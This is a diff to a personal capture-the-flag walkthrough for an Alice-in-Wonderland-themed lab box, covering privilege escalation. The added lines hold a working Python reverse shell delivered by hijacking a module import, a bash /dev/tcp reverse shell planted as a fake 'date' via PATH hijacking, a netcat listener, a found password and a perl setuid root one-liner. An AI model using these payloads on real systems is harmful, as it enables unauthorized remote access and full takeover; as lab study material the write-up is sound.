@@ -31,6 +31,16 @@ sudo python3 -c 'import os; os.system("/bin/sh")'
 - If we create a python script called `random.py` this will be imported into the python script befor ehte actual random module, which means we can get a reverse shell
 ```python
 # script
+import socket
+import subprocess
+import os
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+s.connect(("10.2.91.174",7777));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+os.putenv("HISTFILE", "/dev/null")
+p=subprocess.call(["/bin/bash","-i"]);
 ```
 - then we sut up a listener on port 7777
 ```shell
@@ -53,5 +63,26 @@ Segmentation fault (core dumped)
 - I copied it over to my system `scp teaParty > isabelle@<attack machine IP>`
 - Similar to the python script, it has a relative call, this time to `date`
 - So we employ similar tactics
-
+- cd into `tmp` and create a `date` rev shell script
+- nano was acting wild so I just used echo like this:
+```shell
+echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.2.91.174/9999 0>&1' > date
+```
+- and ran these commands
+```shell
+chmod 755 date
+export PATH=/tmp:$PATH
+```
+- now it references the /tmp file instead of the actual date module
+- I set up a listener on my machine `nc -lvnp 9999`
+- and ran the script `./teaCup`
+- The new user is `hatter`. I CDed into th ehatter directory, where there was a file `password.txt` which contained `WhyIsARavenLikeAWritingDesk?`
+- I was a bit stuck at this point, but I wanted a more stable shell so I SSHed into the hatter profile
+- I ran `linPeas` on the profile which exposed a perl setuid vulnerability
+- I ran this command
+```shell
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+```
+- and got a root shell
+- `cat /home/alice/root.txt` and got the flag
 
